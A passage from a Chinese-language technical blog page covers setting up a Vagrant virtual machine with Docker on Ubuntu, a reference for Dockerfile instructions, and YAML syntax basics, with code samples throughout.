class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      config.vm.network <span class="symbol">:private_network</span>, <span class="symbol">ip:</span> opts[<span class="symbol">:eth1</span>]</span><br><span class="line">      <span class="comment"># config.vm.network :public_network</span></span><br><span class="line">      config.vm.network <span class="string">&quot;forwarded_port&quot;</span>, <span class="symbol">guest:</span> <span class="number">80</span>, <span class="symbol">host:</span> <span class="number">8050</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  config.vm.synced_folder <span class="string">&quot;./labs&quot;</span>, <span class="string">&quot;/home/vagrant/labs&quot;</span>  <span class="comment"># 本地需要手动创建同步目录</span></span><br><span class="line">  config.vm.provision <span class="string">&quot;shell&quot;</span>, <span class="symbol">privileged:</span> <span class="literal">true</span>, <span class="symbol">path:</span> <span class="string">&quot;./setup.sh&quot;</span>  <span class="comment"># 初始化脚本，包括更换源，安装Docker，参考下面的编写</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/hel12he/article/details/51089774">参考文档</a></p>
<h3 id="配置一个带Docker的Vagrant虚拟机"><a href="#配置一个带Docker的Vagrant虚拟机" class="headerlink" title="配置一个带Docker的Vagrant虚拟机"></a>配置一个带Docker的Vagrant虚拟机</h3><p>创建一个目录，并配置如下文件：</p>
<ul>
<li>VirtualBox<ul>
<li>labs<ul>
<li>sources.list</li>
</ul>
</li>
<li>setup.sh</li>
</ul>
</li>
</ul>
<p>编辑setup.sh如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.back</span><br><span class="line">sudo <span class="built_in">rm</span> /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">cp</span> /home/vagrant/labs/sources.list /etc/apt/sources.list </span><br><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable&quot;</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo gpasswd -a ubuntu docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

<p>编辑sources.list内容如下（适用于ubuntu 16.04，其他版本可以自行搜索）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure>

<p>在VirtualBox下执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant init</span><br></pre></td></tr></table></figure>

<p>会生成Vagrantfile文件。打卡文件，编辑：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- mode: ruby -*-</span><br><span class="line"># vi: set ft=ruby :</span><br><span class="line"></span><br><span class="line">Vagrant.configure(&quot;2&quot;) do |config|</span><br><span class="line">  config.vm.box = &quot;box_base&quot;</span><br><span class="line">  config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8030</span><br><span class="line">  config.vm.network &quot;public_network&quot;</span><br><span class="line">  config.vm.synced_folder &quot;./labs&quot;, &quot;/home/vagrant/labs&quot;</span><br><span class="line">  config.vm.provision &quot;shell&quot;, privileged: true, path: &quot;./setup.sh&quot;</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>保存后：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>即可创建虚拟机。输入如下命令登录虚拟机：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>

<h3 id="安装扩展"><a href="#安装扩展" class="headerlink" title="安装扩展"></a>安装扩展</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看插件列表</span></span><br><span class="line">vagrant plugin list</span><br><span class="line"><span class="comment"># 安装插件</span></span><br><span class="line">vagrant plugin install vagrant-scp</span><br><span class="line"><span class="comment"># 使用 scp 复制文件到虚拟机</span></span><br><span class="line">vagrant scp ../node3/labs/ docker-node1:/home/vagrant/labs/</span><br></pre></td></tr></table></figure>







<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><h3 id="Dockerfile-语法"><a href="#Dockerfile-语法" class="headerlink" title="Dockerfile 语法"></a>Dockerfile 语法</h3><p>命令</p>
<h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch      <span class="comment"># 制作base image</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu       <span class="comment"># 使用base image</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">14.04</span> <span class="comment"># 使用特定版本的image</span></span><br></pre></td></tr></table></figure>

<h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>相当于注释：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=<span class="string">&quot;author@web.com&quot;</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> version=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> description=<span class="string">&quot;The Description&quot;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>用于执行后面跟着的命令行命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;这是一个本地构建的nginx镜像&#x27;</span> &gt; /usr/share/nginx/html/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN 有以下俩种格式：</span></span><br><span class="line"><span class="comment"># 1. shell 格式：</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> &lt;命令行命令&gt;</span></span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. exec 格式：</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>

<p>另外，Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install wget</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> tar -xvf redis.tar.gz</span></span><br><span class="line"><span class="comment"># 以上执行会创建 3 层镜像。可简化为以下格式：</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install wget \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -xvf redis.tar.gz</span></span><br><span class="line"><span class="comment"># 以 &amp;&amp; 符号连接命令，这样执行后，只会创建 1 层镜像。</span></span><br></pre></td></tr></table></figure>

<p>编辑保存之后就可以构建Docker镜像了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:<span class="built_in">test</span> .</span><br></pre></td></tr></table></figure>

<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p>
<ul>
<li>CMD 在docker run 时运行。</li>
<li>RUN 是在 docker build用的。</li>
</ul>
<p>作用：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p>
<p>注意：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效；如果在docker run中指明了命令，CMD就会被忽略。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shell 格式</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> &lt;shell 命令&gt; </span></span><br><span class="line"><span class="comment"># Exec 格式</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span></span><br></pre></td></tr></table></figure>

<h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>ENTRYPOINT会让容器以应用程序或服务的方式运行。它类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p>
<p>但是, 如果运行 docker run 时使用了 –entrypoint 选项，此选项的参数可当作要运行的程序覆盖 ENTRYPOINT 指令指定的程序。</p>
<p>优点：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p>注意：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;&lt;executeable&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]</span></span><br></pre></td></tr></table></figure>

<p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p>
<p>示例：</p>
<p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-c&quot;</span>] <span class="comment"># 定参</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/etc/nginx/nginx.conf&quot;</span>] <span class="comment"># 变参 </span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、不传参运行</span></span><br><span class="line">docker run nginx:<span class="built_in">test</span></span><br><span class="line"><span class="comment"># 容器内会默认运行以下命令，启动主进程。</span></span><br><span class="line"><span class="comment"># nginx -c /etc/nginx/nginx.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、传参运行</span></span><br><span class="line">docker run  nginx:<span class="built_in">test</span> -c /etc/nginx/new.conf</span><br><span class="line"><span class="comment"># 容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</span></span><br><span class="line"><span class="comment"># nginx -c /etc/nginx/new.conf</span></span><br></pre></td></tr></table></figure>

<h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p>
<p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> &lt;工作目录路径&gt;</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /test  <span class="comment"># 会自动创建</span></span></span><br></pre></td></tr></table></figure>

<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> [--<span class="built_in">chown</span>=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> [--<span class="built_in">chown</span>=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [--chown=&lt;user&gt;:&lt;group&gt;]：可选参数，用户改变复制到容器内文件的拥有者和属组。</span></span><br><span class="line"><span class="comment"># &lt;源路径&gt;：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hom* /mydir/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hom?.txt /mydir/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;目标路径&gt;：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</span></span><br></pre></td></tr></table></figure>

<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p>
<ul>
<li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li>
<li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> main <span class="built_in">test</span>/  <span class="comment"># /root/test/main</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /ROOT</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> main <span class="built_in">test</span>/</span></span><br></pre></td></tr></table></figure>

<p>如果想要添加远程文件，还是要用命令的方式（curl、wget）较好：</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="keyword">ENV</span> &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line"><span class="keyword">ENV</span> NODE_VERSION <span class="number">7.2</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> curl -SLO <span class="string">&quot;https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz&quot;</span> \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; curl -SLO <span class="string">&quot;https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/SHASUMS256.txt.asc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不加/bin/bash，会导致无法识别ENV变量</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo <span class="variable">$ENV_KEY</span>&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;&#x3D;&lt;值&gt; 来覆盖。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>

<h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷，可以通过 -v 参数修改挂载点。</p>
<p>作用：</p>
<ul>
<li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li>
<li>避免容器不断变大。</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> [<span class="string">&quot;&lt;路径1&gt;&quot;</span>, <span class="string">&quot;&lt;路径2&gt;&quot;</span>...]</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> &lt;路径&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>仅仅只是声明端口。</p>
<p>作用：</p>
<ul>
<li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li>
<li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> &lt;端口<span class="number">1</span>&gt; [&lt;端口<span class="number">2</span>&gt;...]</span><br></pre></td></tr></table></figure>



<h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USER</span> &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>

<h4 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h4><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HEALTHCHECK</span><span class="language-bash"> [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="language-bash"> NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="language-bash"> [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span></span><br></pre></td></tr></table></figure>

<h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ONBUILD</span> &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li>应使用LABEL注明文件作用以及内容；</li>
<li>应使用ENV注明主要变量，方便维护；</li>
<li>应当使用WORKDIR注明工作路径，且推荐使用绝对路径；</li>
<li>应使用COPY为主，需要解压时可以使用ADD；</li>
<li>应当在使用RUN时，尽量合并命令，防止产生多个层；</li>
<li>应当在使用Exec格式时使用”&#x2F;bin&#x2F;bash -c”来识别ENV变量，且被执行的指令应放到一起；</li>
</ol>
<p><a href="https://www.runoob.com/docker/docker-dockerfile.html">参考 菜鸟教程</a></p>
<h3 id="YAML-语法"><a href="#YAML-语法" class="headerlink" title="YAML 语法"></a>YAML 语法</h3><p>YAML脚本的后缀为yml或yaml，基本语法如下：</p>
<ul>
<li>大小写敏感；</li>
<li>使用缩进表示层级关系；</li>
<li>缩进不允许使用tab，只允许空格；</li>
<li>缩进的空格数不重要，只要相同层级的元素左对齐即可；</li>
<li>‘#’表示注释。</li>
</ul>
<p>YMAL 支持三种数据类型：</p>
<ul>
<li>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</li>
<li>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</li>
<li>纯量（scalars）：单个的、不可再分的值</li>
</ul>
<h4 id="YAML-对象"><a href="#YAML-对象" class="headerlink" title="YAML 对象"></a>YAML 对象</h4><p>对象键值对使用冒号结构表示 key: value，冒号后面要加一个空格。</p>
<p>也可以使用 key:{key1: value1, key2: value2, …}。</p>
<p>还可以使用缩进表示层级关系；</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">  <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">  <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>

<p>较为复杂的对象格式，可以使用问号加一个空格代表一个复杂的key，配合一个冒号加一个空格代表一个value，意思即对象的属性是一个数组[complexkey1,complexkey2]，对应的值也是一个数组[complexvalue1,complexvalue2]：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?  </span><br><span class="line">    - complexkey1</span><br><span class="line">    - complexkey2</span><br><span class="line">:</span><br><span class="line">    - complexvalue1</span><br><span class="line">    - complexvalue2</span><br></pre></td></tr></table></figure>

<h4 id="YAML-数组"><a href="#YAML-数组" class="headerlink" title="YAML 数组"></a>YAML 数组</h4><p>以 <code>-</code> 开头的行表示构成一个数组：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 多行表示</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">A</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">B</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">C</span></span><br><span class="line"><span class="comment"># 行内表示：</span></span><br><span class="line"><span class="attr">key:</span> [<span class="string">value1</span>, <span class="string">value2</span>, <span class="string">...</span>]</span><br><span class="line"><span class="comment"># 数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。</span></span><br><span class="line"><span class="bullet">-</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">A</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">B</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个相对复杂的例子：</span></span><br><span class="line"><span class="attr">companies:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company1</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">200W</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company2</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">500W</span></span><br><span class="line"><span class="comment"># 也可以表示为</span></span><br><span class="line"><span class="attr">companies:</span> [&#123;<span class="attr">id:</span> <span class="number">1</span>,<span class="attr">name:</span> <span class="string">company1</span>,<span class="attr">price:</span> <span class="string">200W</span>&#125;,&#123;<span class="attr">id:</span> <span class="number">2</span>,<span class="attr">name:</span> <span class="string">company2</span>,<span class="attr">price:</span> <span class="string">500W</span>&#125;]</span><br></pre></td></tr></table></figure>

<h4 id="复合结构"><a href="#复合结构" class="headerlink" title="复合结构"></a>复合结构</h4><p>数组和对象可以构成复合结构，例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">languages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ruby</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Perl</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Python</span> </span><br><span class="line"><span class="attr">websites:</span></span><br><span class="line">  <span class="attr">YAML:</span> <span class="string">yaml.org</span> </span><br><span class="line">  <span class="attr">Ruby:</span> <span class="string">ruby-lang.org</span> </span><br><span class="line">  <span class="attr">Python:</span> <span class="string">python.org</span> </span><br><span class="line">  <span class="attr">Perl:</span> <span class="string">use.perl.org</span></span><br></pre></td></tr></table></figure>

<h4 id="纯量"><a href="#纯量" class="headerlink" title="纯量"></a>纯量</h4><ul>
<li>字符串</li>
<li>布尔值</li>
<li>整数</li>
<li>浮点数</li>
<li>Null</li>
<li>时间</li>
<li>日期</li>
</ul>
<p>表示方法如下</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2018-02-17</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span 